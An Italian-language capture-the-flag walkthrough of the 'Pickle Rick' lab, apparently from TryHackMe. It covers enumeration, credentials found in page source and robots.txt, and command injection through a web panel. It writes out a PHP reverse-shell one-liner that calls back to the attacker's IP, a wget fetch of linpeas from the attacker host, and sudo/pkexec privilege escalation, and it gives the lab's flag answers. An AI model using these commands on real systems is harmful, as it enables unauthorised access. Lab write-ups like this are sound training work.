@@ -1,0 +1,197 @@
+//Contenuti importanti del file: Uso di wget, upgrade della reverse shell, come passarsi i file da kali a vittima ,uso GTFOBins, uso di find
+
+//Tip: NON cercare di abbellire la reverse shell in modi ambigui, rischio crash !!! 
+//     NON passare linpeas se già sei root, serve per fare priv esc, ma se già sei root...
+//     Utilizza GTFOBins che è una manna dal cielo
+//     Quando usi gobuster, usa sia la ricerca per estensione -x che anche una lista leggermente più grande rispetto alla common.txt (vedi sotto)
+
+### INFORMATION GATHERING ###
+
+╰─ nmap -Pn -A 10.10.196.80
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-22 16:06 CEST
+Nmap scan report for 10.10.196.80
+Host is up (0.046s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) <-- !!!
+| ssh-hostkey: 
+|   3072 7d:c1:6d:4f:34:ba:c2:0d:b5:df:f3:b7:f4:9a:4a:b6 (RSA)
+|   256 53:5a:b1:90:58:31:e0:36:c9:9b:f4:e1:41:3e:0b:df (ECDSA)
+|_  256 de:09:b5:21:ea:81:65:02:fb:fd:f8:9d:7d:e1:39:fb (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))                                <-- !!!
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Rick is sup4r cool
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.81 seconds
+
+Ho la porta 80 aperta, quindi vado sul sito http://10.10.196.80/
+
+Facendo Ctrl+U accedo alla pagina sorgente e trovo che c'è commentato in HTML questo:
+ <!--
+
+    Note to self, remember username!
+
+    Username: R1ckRul3s <-- TOP !!! :D
+
+  -->
+  
+  Uso gobuster per fare uno scan di eventuali subdirectories
+  
+  
+╰─ gobuster dir -u http://10.10.196.80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.196.80
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/assets               (Status: 301) [Size: 313] [--> http://10.10.196.80/assets/] <-- accedendoci trovo un pò di immagini, che però non compaiono sull'index.html quindi probabilmente ci sono altre pagine html/php 
+/index.html           (Status: 200) [Size: 1062]
+/robots.txt           (Status: 200) [Size: 17] <-- accedendo a http://10.10.196.80/robots.txt mi trovo davanti alla parola: Wubbalubbadubdub <--- TOPPERIA MISSILE !!! :D
+/server-status        (Status: 403) [Size: 277] <-- forbidden
+Progress: 4727 / 4727 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+Con le immagini potrei cercare di capire se ho dei messaggi nascosti usando per esempio exiftool, (per scaricarle uso sempre wget, cioè wget IP/nomeimg.ext)
+però provo prima a collegarmi SSH con username: R1ckRul3s e password: Wubbalubbadubdub
+Provando non sono riuscito a fare nulla, quindi provo a fare gobuster in /assets e anche lì nulla e così anche se includo delle estensioni di file da trovare con il flag -x 
+E anche l'uso di exiftool si è rivelato inutile
+
+
+Provo quindi ad usare un altra wordlist, un pò più grande, ed infatti usando /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt e trovo:
+╰─ gobuster dir -u http://10.10.196.80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.196.80
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php,html
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 277]
+/index.html           (Status: 200) [Size: 1062]
+/.html                (Status: 403) [Size: 277]
+/login.php            (Status: 200) [Size: 882]
+/assets               (Status: 301) [Size: 313] [--> http://10.10.196.80/assets/]
+/portal.php           (Status: 302) [Size: 0] [--> /login.php] <-- Ci accedo e mi trovo davanti ad una pagina con un login e la foto portal.jpg 
+
+
+Quindi finalmente, proviamo ad usare le credenziali di prima:
+Username: R1ckRul3s e Password: Wubbalubbadubdub
+Stiamo dentro
+
+
+Mi trovo davanti ad una pagina con un form con scritto "Command" e facendo per esempio "id" mi lista gli id della macchina su cui è hostato il sito
+ho anche varie sezioni del sito, ma possono essere viste solo da un utente superiore, lui dice "dal vero rick"
+facendo infatti "whoami" dice che siamo "www-data"
+
+quindi faccio ls e vedo che mi lista:
+Sup3rS3cretPickl3Ingred.txt
+assets
+clue.txt
+denied.php
+index.html
+login.php
+portal.php
+robots.txt
+
+provo a fare cat Sup3rS3cretPickl3Ingred.txt <- ma il comando cat non è permesso
+ma allora sul terminale faccio: ╰─ wget http://10.10.196.80/Sup3rS3cretPickl3Ingred.txt
+mi scarica il file ed aprendolo trovo:
+╰─ cat Sup3rS3cretPickl3Ingred.txt                                                                      
+mr. meeseek hair <-- PRIMA FLAG :D
+
+---
+Provo a fare la stessa cosa con clue.txt non si sa mai, cattando il file mi esce "Look around the file system for the other ingredient."
+
+Ho provato a prendere una reverse shell, creata con il sito https://www.revshells.com/, prima con nc (senza risultati), poi ho fatto eseguire "php -r '$sock=fsockopen("10.8.107.68",9001);exec("sh <&3 >&3 2>&3");'" nella command line presente sul sito /login.php
+In ascolto sulla mia macchina ho messo "nc -lvnp 9001", e vedo che si è messo in ascolto, cioè non è presente neanche il cursore, quindi provando a scrivere "whoami" mi ha stampato "www-data" e quindi ho ottenuto una reverseshell.
+(Anche sul sito, il comando è stato eseguito ed è rimasto lì, cioè di solito veniva eseguito ed il form diventava di nuovo blank, invece ora si è comportato diversamente)
+
+Cerchiamo di abbellirla: Proviamo eseguendo questi passaggi: https://www.noobsec.net/oscp-cheatsheet/#upgrading-your-shell---linux
+Nevvero non lo facciamo perchè non va (LOL)
+Ho dovuto riavviare la macchina...
+
+Quindi rifacendo la reverse shell come prima, cerco le altre flag
+
+Sta volta, rendo più bella la shell usando il comando: python3 -c "import pty; pty.spawn('/bin/bash')" <- almeno facendoc così mi compare il nome utente, ed è più decente da vedersi, sennò prima erano indecente 
+(Sito da cui ho preso il comando: https://fahmifj.medium.com/get-a-fully-interactive-reverse-shell-b7e8d6f5b1c1)
+
+
+### PRIV ESC ###
+
+Cerco di passarmi linpeas.sh dal mio PC, quindi:
+-Macchina kali (sulla directory contenente linpeas.sh): python3 -m http.server 9999
+-Macchina vittima: wget 10.8.107.68:9999/linpeas.sh 
+Purtroppo mi dà permission denied, cioè non posso passarmelo con i permessi dell'utente www-data
+
+Ora capisco chi ha il SUID attivo attraverso il comando: find / -user root -perm /4000
+E vedo che le scelte sono poche, quindi andando su GTFOBins cerco pian piano sul sito se trovo qualche corrispondenza tra quelli che ho io e quelli presenti su GTFOBins
+E vedo che, tra quelli che ho, "pkexec" può essere sfruttato per diventare root (https://gtfobins.github.io/gtfobins/pkexec/)
+Basta che eseguo: sudo pkexec /bin/sh
+Ora facendo "whoami" mi dice che sono root
+
+---- UN ALTRO MODO PER DIVENTARE "ROOT", PIÙ SEMPLICEMENTE
+
+eseguo il comando sudo -l (come www-data) 
+e vedo che come risposta ho:
+...varie robe...
+User www-data may run the following commands on ip-10-10-196-80.eu-west-1.compute.internal:
+     (ALL) NOPASSWD: ALL
+
+Cioè significa che posso eseguire tutti i comandi con sudo essendo anche utente www-data
+
+
+-----PASSAGGIO LINPEAS (INUTILE) 
+Quindi ora riprovo a passarmi linpeas.sh dal mio PC, e ci riesco senza problemi.
+Facendo ls, per vedere se me lo sono passato correttamente, scopro che nella directory corrente (cioè /root) ci sta un file che si chiama 3rd.txt, lo catto ed esce la stringa: 3rd ingredients: fleeb juice <-- TERZA FLAG :D
+Con lo stesso principio ora cerco la seconda, sperando che si chiami 2nd.txt, e lo faccio con il comando ->  find / -type f -name root.txt 2> /dev/null
+(SPOILER: Il comando non restituisce nulla :| )
+
+(Ovviamente passarmi linpeas.sh sapendo che ero già root, è un pò inutile, però era per avere la soddisfazione di averlo passato ed averlo fatto girare correttamente sulla macchina :D)
+(AH prima di eseguirlo devo fare "chmod +x linpeas.sh" e poi ./linpeas.sh e poi va)
+
+(PRO TIP: Se hai paura come me di perdere la shell, far eseguire linpeas, essendo già root ed aver aver paura di stopparlo con ctrl+c, non è la migliore delle idee)
+HO DOVUTO PREMERE PER FORZA CTRL+C, SI ERA IMPALLATA LA MACCHINA E L'HO DOVUTA RIAVVIARE PER LA SECONDA VOLTA
+
+Passaggio inutile per linpeas, ma utile perchè ho trovato involontariamente la terza stringa
+--------------------------------------
+Dopo vari passaggi sono di nuovo root:
+Cerchiamo la flag 2, andando a logica e a tentativi provo a cercarlo con il comando: find / -name "*second*"  <-- cioè cerco un file che nel nome ha la stringa second e inizio a cercarlo da / (cioè dalla root directory)
+e trovo, oltre ad altri risultati, questo:
+/home/rick/second ingredients
+
+quindi:
+# cd home/rick  
+cd home/rick
+# ls
+ls
+'second ingredients'
+# cat 'second ingredients'
+cat 'second ingredients'
+1 jerry tear  <-- SECONDA FLAG :D
+
+FINE :)
+
